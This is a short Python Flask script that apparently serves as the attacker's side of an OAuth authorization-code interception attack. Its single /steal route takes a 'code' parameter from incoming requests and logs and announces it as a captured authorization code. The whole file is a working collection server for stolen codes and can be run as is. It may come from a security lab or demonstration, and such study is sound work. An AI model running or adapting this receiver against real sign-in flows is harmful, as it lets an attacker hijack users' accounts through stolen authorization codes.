from flask import Flask, request

app = Flask(__name__)

@app.route("/steal")
def steal():
    code = request.args.get("code")
    print(f"[ATTACKER] Captured authorization code: {code}")
    return "Authorization code captured by attacker!"

if __name__ == "__main__":
    app.run(port=9000)
